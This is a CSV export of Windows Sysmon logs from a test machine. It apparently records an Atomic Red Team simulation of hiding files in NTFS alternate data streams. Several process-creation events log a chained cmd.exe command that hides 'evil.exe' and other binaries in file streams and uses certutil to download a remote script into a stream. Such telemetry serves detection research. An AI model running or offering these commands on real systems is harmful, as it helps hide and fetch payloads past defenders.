Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9463,,,,C:\Windows\system32\svchost.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:22.861

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE",Info,,,,,,,{fda94052-34f2-658d-3f00-000000000b00},7044,2948,,,wpad,-,1460,"
      ",-,,,,,,2023-12-28T10:17:00.4930037Z,,,Dns query (rule: DnsQuery),,1124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 23:54:22.861,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:17:00.4930037Z""/>
      <EventRecordID>9463</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:22.861</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f2-658d-3f00-000000000b00}</Data>
      <Data Name=""ProcessId"">2948</Data>
      <Data Name=""QueryName"">wpad</Data>
      <Data Name=""QueryStatus"">1460</Data>
      <Data Name=""QueryResults"">-</Data>
      <Data Name=""Image"">C:\Windows\system32\svchost.exe</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:22.861

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.22621.1194 --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --gpu-preferences=WAAAAAAAAADoAAAMAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAACEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --mojo-platform-channel-handle=4492 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61",Microsoft Corporation,WinDev2309Eval,,C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\,Microsoft Edge WebView2,,,,,,,1,9462,,120.0.2210.91,"MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63",C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:59.601

ProcessGuid: {fda94052-4b1b-658d-7302-000000000b00}

ProcessId: 3580

Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

FileVersion: 120.0.2210.91

Description: Microsoft Edge WebView2

Product: Microsoft Edge WebView2

Company: Microsoft Corporation

OriginalFileName: msedgewebview2.exe

CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.22621.1194 --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --gpu-preferences=WAAAAAAAAADoAAAMAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAACEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --mojo-platform-channel-handle=4492 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63

ParentProcessGuid: {fda94052-b85d-658c-1702-000000000b00}

ParentProcessId: 4184

ParentImage: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

ParentUser: WINDEV2309EVAL\User",Info,msedgewebview2.exe,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61",C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe,{fda94052-b85d-658c-1702-000000000b00},4184,WINDEV2309EVAL\User,{fda94052-4b1b-658d-7302-000000000b00},7044,3580,Microsoft Edge WebView2,,,,,"
      ",-,,,,,,2023-12-28T10:16:59.6118318Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:59.601,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:59.6118318Z""/>
      <EventRecordID>9462</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:59.601</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b1b-658d-7302-000000000b00}</Data>
      <Data Name=""ProcessId"">3580</Data>
      <Data Name=""Image"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe</Data>
      <Data Name=""FileVersion"">120.0.2210.91</Data>
      <Data Name=""Description"">Microsoft Edge WebView2</Data>
      <Data Name=""Product"">Microsoft Edge WebView2</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">msedgewebview2.exe</Data>
      <Data Name=""CommandLine"">""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.22621.1194 --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --gpu-preferences=WAAAAAAAAADoAAAMAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAACEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --mojo-platform-channel-handle=4492 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61</Data>
      <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b85d-658c-1702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">4184</Data>
      <Data Name=""ParentImage"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:59.601

ProcessGuid: {fda94052-4b1b-658d-7302-000000000b00}

ProcessId: 3580

Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

FileVersion: 120.0.2210.91

Description: Microsoft Edge WebView2

Product: Microsoft Edge WebView2

Company: Microsoft Corporation

OriginalFileName: msedgewebview2.exe

CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.22621.1194 --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --gpu-preferences=WAAAAAAAAADoAAAMAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAACEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --mojo-platform-channel-handle=4492 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63

ParentProcessGuid: {fda94052-b85d-658c-1702-000000000b00}

ParentProcessId: 4184

ParentImage: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,expand  \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,LZ Expansion Utility,,,,,,,1,9461,,5.00 (WinBuild.160101.0800),"MD5=5B5BBBA95C4E0815A6D3C87623CC6B61,SHA256=51D7626894719104AADFE4A52D8CDE4E41B9DAAD57266EA642EC27275EAC006A,IMPHASH=6CFFC29FB5449A92D29D48B72EEB323D",C:\Windows\System32\expand.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:56.461

ProcessGuid: {fda94052-4b18-658d-7202-000000000b00}

ProcessId: 9564

Image: C:\Windows\System32\expand.exe

FileVersion: 5.00 (WinBuild.160101.0800)

Description: LZ Expansion Utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: expand

CommandLine: expand  \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5B5BBBA95C4E0815A6D3C87623CC6B61,SHA256=51D7626894719104AADFE4A52D8CDE4E41B9DAAD57266EA642EC27275EAC006A,IMPHASH=6CFFC29FB5449A92D29D48B72EEB323D

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User",Info,expand,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o",C:\Windows\System32\cmd.exe,{fda94052-4b15-658d-6402-000000000b00},5324,WINDEV2309EVAL\User,{fda94052-4b18-658d-7202-000000000b00},7044,9564,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:56.4640655Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:56.461,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:56.4640655Z""/>
      <EventRecordID>9461</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:56.461</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b18-658d-7202-000000000b00}</Data>
      <Data Name=""ProcessId"">9564</Data>
      <Data Name=""Image"">C:\Windows\System32\expand.exe</Data>
      <Data Name=""FileVersion"">5.00 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">LZ Expansion Utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">expand</Data>
      <Data Name=""CommandLine"">expand  \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5B5BBBA95C4E0815A6D3C87623CC6B61,SHA256=51D7626894719104AADFE4A52D8CDE4E41B9DAAD57266EA642EC27275EAC006A,IMPHASH=6CFFC29FB5449A92D29D48B72EEB323D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5324</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:56.461

ProcessGuid: {fda94052-4b18-658d-7202-000000000b00}

ProcessId: 9564

Image: C:\Windows\System32\expand.exe

FileVersion: 5.00 (WinBuild.160101.0800)

Description: LZ Expansion Utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: expand

CommandLine: expand  \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5B5BBBA95C4E0815A6D3C87623CC6B61,SHA256=51D7626894719104AADFE4A52D8CDE4E41B9DAAD57266EA642EC27275EAC006A,IMPHASH=6CFFC29FB5449A92D29D48B72EEB323D

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\regedit.exe""  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey ",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Registry Editor,,,,,,,1,9460,,10.0.22621.1 (WinBuild.160101.0800),"MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072",C:\Windows\regedit.exe,,High,0x8000000000000000,Information,{fda94052-3502-658d-7367-080000000000},0x86773,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:56.418

ProcessGuid: {fda94052-4b18-658d-7102-000000000b00}

ProcessId: 4364

Image: C:\Windows\regedit.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Editor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: REGEDIT.EXE

CommandLine: ""C:\Windows\regedit.exe""  /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=764A52DA6E2AA8610C1EC02E345C5A28,SHA256=93A813D746606E10D35D34DA32667DBB51A57EAC32DAFECF7A3F0C0557339B60,IMPHASH=ABA5C899A3A92E9A15873AD4446C2072

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User",Info,REGEDIT.EXE,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe 